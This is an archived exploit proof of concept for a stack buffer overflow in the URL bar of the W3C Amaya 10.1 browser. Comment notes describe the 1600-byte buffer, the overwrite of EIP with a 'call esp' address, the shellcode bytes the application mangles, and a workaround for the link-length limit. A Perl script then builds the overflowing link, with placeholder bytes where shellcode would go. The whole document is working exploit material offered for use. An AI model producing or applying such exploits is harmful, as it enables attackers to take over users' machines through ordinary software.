<html><head><title>W3C Amaya 10.1 Web Browser (URL Bar) Remote Stack Overflow PoC</title></head><pre>#            W3C Amaya 10.1 Web Browser
#
# Amaya (URL Bar) Remote Stack Overflow Vulnerability
#
# Written and discovered by: 
# r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
#
# Advisory: http://www.bmgsec.com.au/advisory/40/
# ------------------------------------------------------
#
# Shellcode notes: 
# The application fails to correctly process certain bytes: 
# 0x9c becomes 0x9cc2
# Similar events occur with different bytes (0xf8, 0xfb, 0xbe, 0x93, 0xab, 0xaf 0xeb). 
#
# After reviewing the source code, the below function modifies the
# shellcode:  
# Line 902: int TtaWCToMBstring (wchar_t src, unsigned char **dest)
#
# The max value which can be used is 0x1fffff &lt;-- Thanks Luigi!
# ------------------------------------------------------
# 
# The URL bar contains a buffer overflow vulnerability: 
# buffer length: 1600 bytes
#
# [junk] + [eip] +     [shellcode]
#  1600  +   4   +  sizeof(shellcode)
#
# ESP points to data after EIP. 
#
# I found it difficult to access the URL bar via HTML code. For example, compile the above code, 
# write it to a HTML file, then load it into the browser. Attempt to click the link and
# you will notice there is a 800 character limit on the link. 
#
# To bypass this problem click the link then select &quot;Links&quot; &gt;&gt; &quot;Create or change link...&quot;. 
# Now click &quot;Confirm&quot;. Alternatively just copy the payload into the URL bar. 
#
# URL Bar Proof of concept: 
# ----------------------------------------------------
#!/usr/bin/perl

use warnings;
use strict;

my $shellcode = 'C' x 80;

# 0x7D035F53 -&gt; \x53\x5f\x03\x7d &lt;-- Bingo! (call esp)
my $data   =       '&lt;a href=&quot;' .
                        'A' x 1600 .
                        &quot;\x53\x5f\x03\x7d&quot; . # eip (ESP points to stuff after RET, so shellcode)
                        $shellcode . 
                        '&quot;&gt;r0ut3r&lt;/a&gt;';
print $data;

# milw0rm.com [2008-11-24]</pre></html>